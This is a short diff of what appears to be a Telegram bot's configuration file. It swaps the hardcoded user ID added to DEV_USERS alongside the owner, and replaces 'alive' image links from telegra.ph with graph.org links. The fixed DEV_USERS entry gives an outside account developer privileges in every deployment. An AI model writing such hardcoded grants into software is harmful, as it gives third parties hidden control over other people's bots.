@@ -169,7 +169,7 @@ else:
 # Add OWNER_ID to the DRAGONS and DEV_USERS sets
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5907205317)
+DEV_USERS.add(1225278379)
 # <=======================================================================================================>
 
 # <============================================== INITIALIZE APPLICATION =========================================================>
@@ -187,13 +187,13 @@ ALIVE_MSG = """
 """
 
 ALIVE_IMG = [
-    "https://telegra.ph/file/40b93b46642124605e678.jpg",
-    "https://telegra.ph/file/01a2e0cd1b9d03808c546.jpg",
-    "https://telegra.ph/file/ed4385c26dcf6de70543f.jpg",
-    "https://telegra.ph/file/33a8d97739a2a4f81ddde.jpg",
-    "https://telegra.ph/file/cce9038f6a9b88eb409b5.jpg",
-    "https://telegra.ph/file/262c86393730a609cdade.jpg",
-    "https://telegra.ph/file/33a8d97739a2a4f81ddde.jpg",
+    "https://graph.org/file/0805fd87e2ef2db8fa652.jpg",
+    "https://graph.org/file/b8accaf1fc32215a95c8d.jpg",
+    "https://graph.org/file/e780bc4cae78ca6ba3c82.jpg",
+    "https://graph.org/file/4f7e3f5cce4c3a178992c.jpg",
+    "https://graph.org/file/b2e13a93a2b8cad24978e.jpg",
+    "https://graph.org/file/02f3b8a4f40f2ce2db693.jpg",
+    "https://graph.org/file/07dcf96beca557f37e78c.jpg",
 ]
 # <=======================================================================================================>
 
